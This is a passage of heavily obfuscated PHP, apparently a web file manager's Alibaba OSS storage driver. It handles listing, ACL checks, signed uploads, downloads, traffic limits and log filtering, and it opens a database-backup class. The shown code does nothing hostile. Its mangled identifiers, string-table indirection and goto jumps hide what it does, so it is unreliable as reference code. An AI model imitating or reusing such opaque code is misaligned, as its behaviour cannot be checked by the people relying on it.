$™é†ú¼ƒ = array($Ş²ŒòÂ[231] => $¢÷ü ÒÜ[$Ş²ŒòÂ[595]][$Ş²ŒòÂ[1680]], $Ş²ŒòÂ[88] => strtotime($¢÷ü ÒÜ[$Ş²ŒòÂ[1677]])); } if (isset($™é†ú¼ƒ[$Ş²ŒòÂ[88]])) { $¼î¥·ö¯[$Ş²ŒòÂ[88]] = $™é†ú¼ƒ[$Ş²ŒòÂ[88]]; } if (isset($™é†ú¼ƒ[$Ş²ŒòÂ[231]])) { $¼î¥·ö¯[$Ş²ŒòÂ[231]] = $™é†ú¼ƒ[$Ş²ŒòÂ[231]]; } return $¼î¥·ö¯; } public function listPath($¤’éº–, $Ó„ä¸· = false) { $¾™¥øÒô =& $_SERVER[¹Éµ„ºå]; $ëÁÙ˜Íê = $this->fileList($¤’éº–, $¾™¥øÒô[8], !0); foreach ($ëÁÙ˜Íê[$¾™¥øÒô[85]] as $ÃË„–âø => $£±²ŠÃê) { $ëÁÙ˜Íê[$¾™¥øÒô[85]][$ÃË„–âø] = $this->folderInfo($£±²ŠÃê, $Ó„ä¸·, $£±²ŠÃê); } foreach ($ëÁÙ˜Íê[$¾™¥øÒô[86]] as $ÃË„–âø => $£±²ŠÃê) { $ëÁÙ˜Íê[$¾™¥øÒô[86]][$ÃË„–âø] = $this->fileInfo($£±²ŠÃê[$¾™¥øÒô[32]], $Ó„ä¸·, $£±²ŠÃê); } return $ëÁÙ˜Íê; } protected function infoChildren($€“Ùäğ, &$«ùŠÅæ) { $Á’åáèâ =& $_SERVER[¹Éµ„ºå]; $Äô‹ñôï = $this->fileList($€“Ùäğ, $Á’åáèâ[12], !0); $«ùŠÅæ[$Á’åáèâ[81]] += count($Äô‹ñôï[$Á’åáèâ[85]]); $«ùŠÅæ[$Á’åáèâ[80]] += count($Äô‹ñôï[$Á’åáèâ[86]]); foreach ($Äô‹ñôï[$Á’åáèâ[86]] as $Æƒà›¹Ã) { if (!$Æƒà›¹Ã || !$Æƒà›¹Ã[$Á’åáèâ[79]]) { continue; } $«ùŠÅæ[$Á’åáèâ[79]] += $Æƒà›¹Ã[$Á’åáèâ[79]]; } } public function has($€Ø¨øù, $ÅºÏË÷ç = false, $şÏ€Š µ = true) { $Ú„¨´¶ =& $_SERVER[¹Éµ„ºå]; $€Ø¨øù = trim($€Ø¨øù, $Ú„¨´¶[8]); $èØ÷™Ñ• = empty($€Ø¨øù) && $€Ø¨øù !== $Ú„¨´¶[228] ? $Ú„¨´¶[12] : $€Ø¨øù . $Ú„¨´¶[8]; $Ğ¸Ü €Ä = $Ú„¨´¶[12]; $Á°µÌ¼Û = 500; $Š˜®§ë = $ âº¬½¸ = 0; while (!0) { check_abort(); $¶¬åäñ× = array($Ú„¨´¶[1671] => $Ú„¨´¶[8], $Ú„¨´¶[1672] => $èØ÷™Ñ•, $Ú„¨´¶[1673] => $Á°µÌ¼Û, $Ú„¨´¶[1674] => $Ğ¸Ü €Ä); try { $–§ë°×› = $this->client->listObjects($this->bucket, $¶¬åäñ×); } catch (OSS\Core\OssException $—“¾Â“©) { $this->writeLog(__FUNCTION__ . $Ú„¨´¶[212] . $—“¾Â“©->getMessage()); break; } $Ğ¸Ü €Ä = $–§ë°×›->getNextMarker(); $»ğË¥¸Ö = $–§ë°×›->getObjectList(); $ÓÃ•÷™Ğ = $–§ë°×›->getPrefixList(); if ($ÅºÏË÷ç) { if (count($»ğË¥¸Ö) > 1 || count($»ğË¥¸Ö) == 1 && $»ğË¥¸Ö[0]->getKey() != $èØ÷™Ñ•) { $Š˜®§ë += count($»ğË¥¸Ö) - 1; } if (!empty($ÓÃ•÷™Ğ)) { $ âº¬½¸ += count($ÓÃ•÷™Ğ); } if ($Ğ¸Ü €Ä === $Ú„¨´¶[12]) { break; } continue; } if ($şÏ€Š µ) { if (!empty($»ğË¥¸Ö)) { if (count($»ğË¥¸Ö) > 1 || $»ğË¥¸Ö[0]->getKey() != $èØ÷™Ñ•) { return !0; } } } else { if (!empty($ÓÃ•÷™Ğ)) { return !0; } } if ($Ğ¸Ü €Ä === $Ú„¨´¶[12]) { break; } } if ($ÅºÏË÷ç) { return array($Ú„¨´¶[239] => $Š˜®§ë, $Ú„¨´¶[240] => $ âº¬½¸); } return !1; } public function listAll($®°—µı) { $£Åò±—• =& $_SERVER[¹Éµ„ºå]; $º§¾º­³ = $this->fileList($®°—µı, $£Åò±—•[12], !0); $§ŠËæ„ = array_to_keyvalue($º§¾º­³[$£Åò±—•[86]], $£Åò±—•[32]); foreach ($º§¾º­³[$£Åò±—•[85]] as $Ï’šû“ç) { if (is_string($Ï’šû“ç)) { $§ŠËæ„[$Ï’šû“ç] = array($£Åò±—•[79] => 0); } } return $this->listAllFiles($®°—µı, $§ŠËæ„); } public function canRead($Ãß£§¸·) { $‹êëúÛÈ =& $_SERVER[¹Éµ„ºå]; $õåÂ‰¡˜ = $this->pathAcl($Ãß£§¸·); return $õåÂ‰¡˜ == $‹êëúÛÈ[1681] || $õåÂ‰¡˜ == $‹êëúÛÈ[642] ? !0 : !1; } public function canWrite($‘¾ü”©É) { $Ÿì°æ• = $this->pathAcl($‘¾ü”©É); return $Ÿì°æ• == $_SERVER[¹Éµ„ºå][642] ? !0 : !1; } public function pathAcl($ıØù¨¯) { $ª­§Îş =& $_SERVER[¹Éµ„ºå]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $»™’Ïøé = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ıØù¨¯)); } catch (OSS\Core\OssException $¾ô¢ÈæÃ) { $this->writeLog(__FUNCTION__ . $ª­§Îş[212] . $¾ô¢ÈæÃ->getMessage()); return !1; } $ª¢Ëë‚Î = $»™’Ïøé == $ª­§Îş[37] ? $this->bucketAcl : $»™’Ïøé; if ($ª¢Ëë‚Î == $ª­§Îş[1682]) { return $ª­§Îş[1681]; } if ($ª¢Ëë‚Î == $ª­§Îş[1683]) { return $ª­§Îş[642]; } return $ª¢Ëë‚Î; } private function chmodPath($ŸËƒ ¥§, $Ê¿¬°İó = '') { $‰ÀÁ¾äœ =& $_SERVER[¹Éµ„ºå]; $À£õÜÒÂ = empty($Ê¿¬°İó) ? $‰ÀÁ¾äœ[1683] : $Ê¿¬°İó; $Æ •³î = array($‰ÀÁ¾äœ[37], $‰ÀÁ¾äœ[229], $‰ÀÁ¾äœ[1682], $‰ÀÁ¾äœ[1683]); if (!in_array($À£õÜÒÂ, $Æ •³î)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ŸËƒ ¥§), $À£õÜÒÂ); } catch (OSS\Core\OssException $âÑî™ß) { $this->writeLog(__FUNCTION__ . $‰ÀÁ¾äœ[212] . $âÑî™ß->getMessage()); return !1; } return !0; } public function getContent($øú·”×) { return $this->fileSubstr($øú·”×, -1); } public function setContent($Ğºö°—Å, $¦ÂÛ©Ï = '') { $¨îü¾ÖÙ =& $_SERVER[¹Éµ„ºå]; try { $µÛ½ŞŒ = $this->trafficLimit($¨îü¾ÖÙ[1684]); $¯ó½ÔßÒ = $this->client->putObject($this->bucket, $this->pathEncode($Ğºö°—Å), $¦ÂÛ©Ï, $µÛ½ŞŒ); } catch (OSS\Core\OssException $ÙúÙÊ…) { $this->writeLog(__FUNCTION__ . $¨îü¾ÖÙ[212] . $ÙúÙÊ…->getMessage()); return !1; } $–©„ó”Æ = array($¨îü¾ÖÙ[1678] => trim($¯ó½ÔßÒ[$¨îü¾ÖÙ[1675]], $¨îü¾ÖÙ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ğºö°—Å))); $this->updateObjMeta($Ğºö°—Å, $–©„ó”Æ); return isset($¯ó½ÔßÒ[$¨îü¾ÖÙ[1685]][$¨îü¾ÖÙ[294]]) ? !0 : !1; } private function updateObjMeta($•¶òô¨Ä, $øäÓ¤š„) { $•¶òô¨Ä = $this->pathEncode($•¶òô¨Ä); try { $úè±ğÑµ = array(OSS\OssClient::OSS_HEADERS => $øäÓ¤š„); $this->client->copyObject($this->bucket, $•¶òô¨Ä, $this->bucket, $•¶òô¨Ä, $úè±ğÑµ); } catch (OSS\Core\OssException $ï±š‹ë) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][212] . $ï±š‹ë->getMessage()); return !1; } return !0; } public function upload($ËŒÉš‰©, $óÈ ÛÇâ, $­èÄ  = false, $Î¹¾†³¦ = REPEAT_REPLACE) { $©ŒâĞº =& $_SERVER[¹Éµ„ºå]; if (!$óÈ ÛÇâ || !@file_exists($óÈ ÛÇâ)) { return !1; } $í«±â”ü = trim($ËŒÉš‰©, $©ŒâĞº[8]); $ÍÌöî±¯ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($©ŒâĞº[1678] => @md5_file($óÈ ÛÇâ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ËŒÉš‰©))); $ÍÌöî±¯ = $this->trafficLimit($©ŒâĞº[1684], $ÍÌöî±¯); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($í«±â”ü), $óÈ ÛÇâ, $ÍÌöî±¯); } catch (OSS\Core\OssException $Ñ¯ş˜Á´) { $this->writeLog(__FUNCTION__ . $©ŒâĞº[212] . $Ñ¯ş˜Á´->getMessage()); return !1; } return $this->getPathOuter($ËŒÉš‰©); } public function getHost() { $Ü’¼©ö =& $_SERVER[¹Éµ„ºå]; $†ú÷…¨î = explode($Ü’¼©ö[208], parent::getHost()); return $†ú÷…¨î[0] . $Ü’¼©ö[208] . $this->bucket . $Ü’¼©ö[10] . $†ú÷…¨î[1]; } public function uploadFormData($ÛÔùŠÜ¹, $Ãõ˜à§ = 3600) { $‚ËûÒí” =& $_SERVER[¹Éµ„ºå]; if (!($Ò¢¿‘€Ì = $this->getHost())) { return !1; } $ ‹¶€Ú = $Ãõ˜à§; $Ş¾øû‚¡ = date($‚ËûÒí”[1686], time() + $ ‹¶€Ú); $Ø‘èî†Ñ = new DateTime($Ş¾øû‚¡); $¼²ğüåË = $Ø‘èî†Ñ->format(DateTime::ISO8601); $Åáº­Š = strpos($¼²ğüåË, $‚ËûÒí”[371]); $¼²ğüåË = substr($¼²ğüåË, 0, $Åáº­Š) . $‚ËûÒí”[1687]; $òÄâÍÉä = 1048576000 * 5; $–äÉğê­ = $this->pathFather($ÛÔùŠÜ¹); $²Ò£ÄâÚ = array($‚ËûÒí”[262] => $¼²ğüåË, $‚ËûÒí”[265] => array(array($‚ËûÒí”[1688], 0, $òÄâÍÉä), array($‚ËûÒí”[267], $‚ËûÒí”[268], $–äÉğê­))); $É¿¿™â = base64_encode(json_encode($²Ò£ÄâÚ)); $ ¹»Ùş = base64_encode(hash_hmac($‚ËûÒí”[1513], $É¿¿™â, $this->secret, !0)); $×š¦‰¤ı = array($‚ËûÒí”[1689] => $this->accessKey, $‚ËûÒí”[277] => $É¿¿™â, $‚ËûÒí”[270] => $‚ËûÒí”[261], $‚ËûÒí”[1690] => $ ¹»Ùş, $‚ËûÒí”[206] => $Ò¢¿‘€Ì); $×š¦‰¤ı = $this->trafficLimit($‚ËûÒí”[1684], $×š¦‰¤ı, !0); return $×š¦‰¤ı; } public function uploadMultiData($Ğ‰öÏ½ , $Ä½›‹Ï = 3600) { $”ÃÁşª¸ =& $_SERVER[¹Éµ„ºå]; if (!($ˆÅú›îñ = $this->getHost())) { return !1; } $½±ºìÇà = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ğ‰öÏ½ )); return array($”ÃÁşª¸[281] => $½±ºìÇà, $”ÃÁşª¸[206] => $ˆÅú›îñ . $”ÃÁşª¸[8] . $this->pathEncode($Ğ‰öÏ½ ), $”ÃÁşª¸[282] => gmdate($”ÃÁşª¸[1691]), $”ÃÁşª¸[95] => $Ğ‰öÏ½ ); } public function uploadMultiAuth($ÔáğÅÚº, $¡¾àĞ° = array()) { if (isset($¡¾àĞ°[$_SERVER[¹Éµ„ºå][283]])) { return $this->uploadPartAuth($ÔáğÅÚº, $¡¾àĞ°); } return $this->uploadListAuth($ÔáğÅÚº, $¡¾àĞ°); } private function uploadPartAuth($°…ÎûÏà, $’é© · = array()) { $Ìˆ‹éÁí =& $_SERVER[¹Éµ„ºå]; $ÂŞ›© = $’é© ·[$Ìˆ‹éÁí[95]]; $Ã•öÌÅ = $this->_getUploadAuth($ÂŞ›©, $’é© ·); $ğ´Ğ˜“ş = array($Ìˆ‹éÁí[286] => $Ã•öÌÅ[$Ìˆ‹éÁí[286]], $Ìˆ‹éÁí[282] => $Ã•öÌÅ[$Ìˆ‹éÁí[282]]); if (isset($Ã•öÌÅ[$Ìˆ‹éÁí[1692]])) { $ğ´Ğ˜“ş[$Ìˆ‹éÁí[1692]] = $Ã•öÌÅ[$Ìˆ‹éÁí[1692]]; } return $ğ´Ğ˜“ş; } private function uploadListAuth($Ÿ®¥«±, $¹Ñ¦ïï÷ = array()) { $¢¦²·‘ =& $_SERVER[¹Éµ„ºå]; $–­¸­îå = $¹Ñ¦ïï÷[$¢¦²·‘[95]]; $Ô¡Ã£•É = $¹Ñ¦ïï÷[$¢¦²·‘[281]]; $îå¬ñê = $this->client->listParts($this->bucket, $this->pathEncode($–­¸­îå), $Ô¡Ã£•É); $„¢Äƒœ© = $îå¬ñê->getListPart(); $ÀÌïºîù = array(); foreach ($„¢Äƒœ© as $Œêô÷ƒú) { $ÀÌïºîù[] = array($¢¦²·‘[297] => $Œêô÷ƒú->getPartNumber(), $¢¦²·‘[298] => trim($Œêô÷ƒú->getETag(), $¢¦²·‘[118])); } if (!$ÀÌïºîù) { return !1; } $ØèñÏ•’ = $this->_getUploadAuth($–­¸­îå, $¹Ñ¦ïï÷); return array($¢¦²·‘[286] => $ØèñÏ•’[$¢¦²·‘[286]], $¢¦²·‘[282] => $ØèñÏ•’[$¢¦²·‘[282]], $¢¦²·‘[289] => $ÀÌïºîù); } private function _getUploadAuth($†›‘–Ñ¥, $¼™ÅŒç”) { $Ğ¨‘Àİ =& $_SERVER[¹Éµ„ºå]; $ğú±Üú = gmdate($Ğ¨‘Àİ[1691]); $¨şã†•ş = isset($¼™ÅŒç”[$Ğ¨‘Àİ[283]]) ? $Ğ¨‘Àİ[253] : $Ğ¨‘Àİ[288]; $›î¨Êå = array_intersect_key($¼™ÅŒç”, array_flip(array($Ğ¨‘Àİ[283], $Ğ¨‘Àİ[281]))); ksort($›î¨Êå); $ûæûê×× = $›î¨Êå ? $Ğ¨‘Àİ[76] . http_build_query($›î¨Êå, null, $Ğ¨‘Àİ[284], PHP_QUERY_RFC3986) : $Ğ¨‘Àİ[12]; $ê«Ô±á± = array($¨şã†•ş, $Ğ¨‘Àİ[12], $Ğ¨‘Àİ[120], $ğú±Üú, "\170\55\x6f\x73\163\55\x64\141\x74\x65\72{$ğú±Üú}", $Ğ¨‘Àİ[8] . $this->bucket . $Ğ¨‘Àİ[8] . $†›‘–Ñ¥ . $ûæûê××); if (isset($¼™ÅŒç”[$Ğ¨‘Àİ[283]])) { $ÍÙáÂ¯ğ = $this->trafficLimit($Ğ¨‘Àİ[1684], array(), !0); if ($ÍÙáÂ¯ğ) { $†›‘–Ñ¥ = $Ğ¨‘Àİ[1692]; array_splice($ê«Ô±á±, 5, 0, $†›‘–Ñ¥ . $Ğ¨‘Àİ[4] . $ÍÙáÂ¯ğ[$†›‘–Ñ¥]); } } $¤´ú‘œŞ = implode($Ğ¨‘Àİ[285], $ê«Ô±á±); $ÖÈ©¼Õ = base64_encode(hash_hmac($Ğ¨‘Àİ[1513], $¤´ú‘œŞ, $this->secret, !0)); $¤é”‰Ôú = $Ğ¨‘Àİ[1661] . $this->accessKey . $Ğ¨‘Àİ[4] . $ÖÈ©¼Õ; $úªõÜ®û = array($Ğ¨‘Àİ[286] => $¤é”‰Ôú, $Ğ¨‘Àİ[282] => $ğú±Üú); if (!empty($ÍÙáÂ¯ğ)) { $úªõÜ®û = array_merge($úªõÜ®û, $ÍÙáÂ¯ğ); } return $úªõÜ®û; } public function download($—ùÌÆ, $šÜƒØ¨Ş) { $Í½—ù¥ä =& $_SERVER[¹Éµ„ºå]; if ($this->isFolder($—ùÌÆ)) { return !1; } try { $†£¹› = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $šÜƒØ¨Ş); $†£¹› = $this->trafficLimit($Í½—ù¥ä[109], $†£¹›); $this->client->getObject($this->bucket, $this->pathEncode($—ùÌÆ), $†£¹›); } catch (OSS\Core\OssException $É®‚‚‰§) { $this->writeLog(__FUNCTION__ . $Í½—ù¥ä[212] . $É®‚‚‰§->getMessage()); return !1; } return $šÜƒØ¨Ş; } public function fileSubstr($ÖÙö“¬, $¤Ãòš È = 0, $¯ùıÂà = false) { if ($¤Ãòš È === -1) { $Šº¬ï¥® = array(); } else { if ($¯ùıÂà === !1) { $´çŠïÊ° = $this->size($ÖÙö“¬); } else { $´çŠïÊ° = $¤Ãòš È + $¯ùıÂà - 1; } $Šº¬ï¥® = array(OSS\OssClient::OSS_RANGE => "{$¤Ãòš È}\55{$´çŠïÊ°}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÖÙö“¬), $Šº¬ï¥®); } catch (OSS\Core\OssException $û˜¶†â¼) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][212] . $û˜¶†â¼->getMessage()); think_exception($û˜¶†â¼->getMessage()); return !1; } } private function trafficLimit($ôÚÄÅù­, $­¸ÓÊì¹ = array(), $Âˆ¥Ù¾î = false) { $äàú´òà =& $_SERVER[¹Éµ„ºå]; if ($ôÚÄÅù­ == $äàú´òà[1684] && $this->isUploadServer() || $ôÚÄÅù­ == $äàú´òà[109] && $this->isFileOutServer()) { return $­¸ÓÊì¹; } $Æ¿ğº² = floatval($GLOBALS[$äàú´òà[6]][$äàú´òà[92]][$äàú´òà[107]][$ôÚÄÅù­]) * 1024 * 1024 * 8; if (!$Æ¿ğº²) { return $­¸ÓÊì¹; } $Æ¿ğº² = $Æ¿ğº² < 819200 ? 819200 : ($Æ¿ğº² > 838860800 ? 838860800 : $Æ¿ğº²); if ($Âˆ¥Ù¾î) { $­¸ÓÊì¹[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Æ¿ğº²); } else { if (!isset($­¸ÓÊì¹[OSS\OssClient::OSS_HEADERS])) { $­¸ÓÊì¹[OSS\OssClient::OSS_HEADERS] = array(); } $­¸ÓÊì¹[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Æ¿ğº²); } return $­¸ÓÊì¹; } public function link($÷¡à‘Á¹, $ÏÖóö = array()) { $ú¢¹ÁŸ° =& $_SERVER[¹Éµ„ºå]; if (!$this->exist($÷¡à‘Á¹) || $this->isFolder($÷¡à‘Á¹)) { return !1; } try { $ÏÖóö = $this->trafficLimit($ú¢¹ÁŸ°[109], $ÏÖóö, !0); $İœù¯Õ¡ = $this->client->signUrl($this->bucket, $this->pathEncode($÷¡à‘Á¹), 3600 * 12, $ú¢¹ÁŸ°[1595], $ÏÖóö); return $this->getCdnLink($İœù¯Õ¡); } catch (OSS\Core\OssException $ü«ÜˆÚ•) { $this->writeLog(__FUNCTION__ . $ú¢¹ÁŸ°[212] . $ü«ÜˆÚ•->getMessage()); return !1; } } public function fileOut($£“Õñ”Ä, $ËÀ¦á×Ğ = false, $ª†À‹²¼ = false, $¨Ø‚É“ê = '') { $¦ñô¶» =& $_SERVER[¹Éµ„ºå]; if ($this->isFileOutServer()) { return $this->fileOutServer($£“Õñ”Ä, $ËÀ¦á×Ğ, $ª†À‹²¼, $¨Ø‚É“ê); } if (!$ª†À‹²¼) { $ª†À‹²¼ = $this->pathThis($£“Õñ”Ä); } $ª†À‹²¼ = rawurlencode($ª†À‹²¼); $®–ØÒí­ = get_file_mime(get_path_ext($ª†À‹²¼)); if ($®–ØÒí­ == $¦ñô¶»[248]) { return parent::fileOut($£“Õñ”Ä, $ËÀ¦á×Ğ, $ª†À‹²¼, $¨Ø‚É“ê); } $ËÀ¦á×Ğ = $ËÀ¦á×Ğ ? $¦ñô¶»[1693] : $¦ñô¶»[1694]; $£ı—ÉØú = array(OSS\OssClient::OSS_SUB_RESOURCE => $¦ñô¶»[1695] . rawurlencode("{$ËÀ¦á×Ğ}\73\x66\151\x6c\x65\156\141\x6d\145\75{$ª†À‹²¼}")); $˜¬èÑ’µ = $this->link($£“Õñ”Ä, $£ı—ÉØú); $this->fileOutLink($˜¬èÑ’µ); } public function fileOutServer($«¡Ù±Æ¶, $Ú“Ò´€ç = false, $½˜«¢ = false, $±Ş‡Øî‚ = '') { parent::fileOut($«¡Ù±Æ¶, $Ú“Ò´€ç, $½˜«¢, $±Ş‡Øî‚); } public function fileOutImage($¼¼ï¼ê, $ Œó‚õ = 250) { if ($this->size($¼¼ï¼ê) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¼¼ï¼ê, $ Œó‚õ); } $×³Õ†ñ• = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¹Éµ„ºå][1658] . $ Œó‚õ); $¨Ìˆ´‘— = $this->link($¼¼ï¼ê, $×³Õ†ñ•); $this->fileOutLink($¨Ìˆ´‘—); } public function fileOutImageServer($‚äˆè¤, $æãøúøÍ = 250) { parent::fileOutImage($‚äˆè¤, $æãøúøÍ); } public function fileOutLink($‚ôÈŞ£Ö) { $¥Äù©–‹ =& $_SERVER[¹Éµ„ºå]; if (!$this->isCdnHost() && substr($‚ôÈŞ£Ö, 0, 7) == $¥Äù©–‹[216]) { $‚ôÈŞ£Ö = $¥Äù©–‹[217] . substr($‚ôÈŞ£Ö, 7); } header($¥Äù©–‹[172] . $‚ôÈŞ£Ö); die; } public function hashMd5($™“Âï³£, $¤¦²¯´Ÿ = '') { $ŒÏˆ˜ƒ˜ =& $_SERVER[¹Éµ„ºå]; $ÉŠ›õŠ = $this->_objectMeta($™“Âï³£); if (!$ÉŠ›õŠ) { return $ŒÏˆ˜ƒ˜[12]; } if (!isset($ÉŠ›õŠ[$ŒÏˆ˜ƒ˜[1678]]) && !empty($¤¦²¯´Ÿ)) { $ĞÎ³··Â = $this->updateObjMeta($™“Âï³£, array($ŒÏˆ˜ƒ˜[1678] => $¤¦²¯´Ÿ)); $ÉŠ›õŠ[$ŒÏˆ˜ƒ˜[1678]] = $ĞÎ³··Â ? $¤¦²¯´Ÿ : $ŒÏˆ˜ƒ˜[12]; } return isset($ÉŠ›õŠ[$ŒÏˆ˜ƒ˜[1678]]) ? strtolower($ÉŠ›õŠ[$ŒÏˆ˜ƒ˜[1678]]) : $ŒÏˆ˜ƒ˜[12]; } public function size($«•×ÓÊ) { $¿©ê„ = $this->objectMeta($«•×ÓÊ); return $¿©ê„ ? $¿©ê„[$_SERVER[¹Éµ„ºå][79]] : 0; } public function info($Á£ØŞ¢­) { if ($this->isFolder($Á£ØŞ¢­)) { return $this->folderInfo($Á£ØŞ¢­); } else { if ($this->isFile($Á£ØŞ¢­)) { return $this->fileInfo($Á£ØŞ¢­); } } return !1; } public function exist($Ğ¶ºÜÃ¥) { return $this->isFile($Ğ¶ºÜÃ¥) || $this->isFolder($Ğ¶ºÜÃ¥); } public function isFile($´«”ŞŸ) { return !$this->isFolder($´«”ŞŸ) && $this->objectMeta($´«”ŞŸ); } public function isFolder($¸ã†ü¹ü) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][177], $¸ã†ü¹ü); } protected function objectMeta($âıš‡Ã‚) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][179], $âıš‡Ã‚); } protected function _objectMeta($§ÄŸÙÙŸ) { $ùäî„Â° =& $_SERVER[¹Éµ„ºå]; try { $ğìÍ”™ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($§ÄŸÙÙŸ)); } catch (OSS\Core\OssException $ÒÕ¶ïİı) { $this->writeLog(__FUNCTION__ . $ùäî„Â°[212] . $ÒÕ¶ïİı->getMessage()); $ğìÍ”™ = !1; } if ($ğìÍ”™) { $ğìÍ”™[$ùäî„Â°[79]] = intval($ğìÍ”™[$ùäî„Â°[1676]]); } return $ğìÍ”™; } protected function _isFolder($¤÷‡Ğ¯ß) { $¥¬Ç‘ó² =& $_SERVER[¹Éµ„ºå]; if ($¤÷‡Ğ¯ß == $¥¬Ç‘ó²[12] || $¤÷‡Ğ¯ß == $¥¬Ç‘ó²[8]) { return !0; } $Ò†§ô¯™ = array($¥¬Ç‘ó²[1671] => $¥¬Ç‘ó²[8], $¥¬Ç‘ó²[1672] => rtrim($¤÷‡Ğ¯ß, $¥¬Ç‘ó²[8]) . $¥¬Ç‘ó²[8], $¥¬Ç‘ó²[1673] => 1, $¥¬Ç‘ó²[1674] => $¥¬Ç‘ó²[12]); $Ë¶µ”® = $this->client->listObjects($this->bucket, $Ò†§ô¯™); if ($Ë¶µ”®->getObjectList() || $Ë¶µ”®->getPrefixList()) { return !0; } return !1; } public function writeLog($Ş…’öÂ = '', $–ÆŞÆ÷ = false) { $¦ÍĞ·¿† =& $_SERVER[¹Éµ„ºå]; $‘Æ±ìê¿ = in_array(ACTION, array($¦ÍĞ·¿†[210], $¦ÍĞ·¿†[211])); if (!$‘Æ±ìê¿ && !GLOBAL_DEBUG) { return; } $°Ÿ”ØØ = 0; if (stripos($Ş…’öÂ, $¦ÍĞ·¿†[1696]) !== !1) { $°Ÿ”ØØ = 1; $é¶¿­Ù = explode($¦ÍĞ·¿†[1697], $Ş…’öÂ); $Ş…’öÂ = !empty($é¶¿­Ù[1]) ? $é¶¿­Ù[1] : $Ş…’öÂ; } else { if (stripos($Ş…’öÂ, $¦ÍĞ·¿†[1698])) { $°Ÿ”ØØ = 2; $é¶¿­Ù = explode($¦ÍĞ·¿†[1698], $Ş…’öÂ); $é¶¿­Ù = explode($¦ÍĞ·¿†[4], $é¶¿­Ù[0]); $Ş…’öÂ = !empty($é¶¿­Ù[1]) ? $é¶¿­Ù[1] : $Ş…’öÂ; } } if ($‘Æ±ìê¿ && I18n::getType() == $¦ÍĞ·¿†[1699]) { if ($°Ÿ”ØØ == 1) { $Ş…’öÂ = str_replace($¦ÍĞ·¿†[1700], $¦ÍĞ·¿†[1701], $Ş…’öÂ); } else { if ($°Ÿ”ØØ == 2) { $é¶¿­Ù = explode($¦ÍĞ·¿†[212], $é¶¿­Ù[0]); $Ó…®ø…¶ = isset($é¶¿­Ù[1]) ? $é¶¿­Ù[1] : $¦ÍĞ·¿†[12]; $á·Ç›´Ñ = array($¦ÍĞ·¿†[1702] => $¦ÍĞ·¿†[1703], $¦ÍĞ·¿†[1704] => $¦ÍĞ·¿†[1705], $¦ÍĞ·¿†[1706] => $¦ÍĞ·¿†[1707], $¦ÍĞ·¿†[1708] => $¦ÍĞ·¿†[1709], $¦ÍĞ·¿†[1710] => $¦ÍĞ·¿†[1711], $¦ÍĞ·¿†[1712] => $¦ÍĞ·¿†[1713], $¦ÍĞ·¿†[1714] => $¦ÍĞ·¿†[1715], $¦ÍĞ·¿†[1716] => $¦ÍĞ·¿†[1717], $¦ÍĞ·¿†[1718] => $¦ÍĞ·¿†[1719], $¦ÍĞ·¿†[1720] => $¦ÍĞ·¿†[1721]); if (isset($á·Ç›´Ñ[$Ó…®ø…¶])) { $Ş…’öÂ = $á·Ç›´Ñ[$Ó…®ø…¶]; } } } if (stripos($Ş…’öÂ, $¦ÍĞ·¿†[1722])) { $Ş…’öÂ = $¦ÍĞ·¿†[1723]; } } if (!trim($Ş…’öÂ)) { return; } parent::writeLog(trim($Ş…’öÂ), $–ÆŞÆ÷); } } goto AÌ§î®çÁŒ; fØì¤ˆ¢: class BackupDbFile { public function __construct() { } public function index() { $ƒº³şïñ =& $_SERVER[¹Éµ„ºå]; $â¤ÄÏÍ = Backup::get(); $†éõ›¼¼ = $â¤ÄÏÍ[$ƒº³şïñ[32]]; $Îé½Ìü† = $this->tmpFilesPath() . "\x62\141\x63\153\165\160\137{$†éõ›¼¼}\x2f"; $ÁÃª¼¥± = $this->backupPath($â¤ÄÏÍ); if (!($ÁÃª¼¥± = IO::mkdir($ÁÃª¼¥±))) { Backup::log($ƒº³şïñ[891] . $ÁÃª¼¥±); return !1; } $œƒà±Ö = new DbManage(); $ıŒÑŞÉŒ = $œƒà±Ö->getSqlFile(); if (!$ıŒÑŞÉŒ || !$ıŒÑŞÉŒ[$ƒº³şïñ[892]] || !$ıŒÑŞÉŒ[$ƒº³şïñ[13]]) { Backup::log($ƒº³şïñ[893]); return !1; } IO::move($ıŒÑŞÉŒ[$ƒº³şïñ[892]], $Îé½Ìü†); IO::move($ıŒÑŞÉŒ[$ƒº³şïñ[13]], $Îé½Ìü†); $œƒà±Ö->mixBakList($Îé½Ìü†); $™êıŒ¸¸ = IO::listPath($Îé½Ìü†); $–ŠìÓ“ƒ = isset($™êıŒ¸¸[$ƒº³şïñ[86]]) ? $™êıŒ¸¸[$ƒº³şïñ[86]] : array(); $¼÷½¡Ãí = array_sum(array_column($–ŠìÓ“ƒ, $ƒº³şïñ[79])); if (!$¼÷½¡Ãí) { Backup::log($ƒº³şïñ[894] . $Îé½Ìü†); return !1; } $èÌ˜ùòı = array($ƒº³şïñ[895] => $¼÷½¡Ãí, $ƒº³şïñ[896] => time()); Backup::set($èÌ˜ùòı); Hook::trigger($ƒº³şïñ[897], $Îé½Ìü†, $ÁÃª¼¥±); $§Ÿ›¬”â = new TaskFileTransfer($ƒº³şïñ[897], $ƒº³şïñ[870], count($–ŠìÓ“ƒ), LNG($ƒº³şïñ[878]) . $ƒº³şïñ[476] . LNG($ƒº³şïñ[880]) . $ƒº³şïñ[898]); 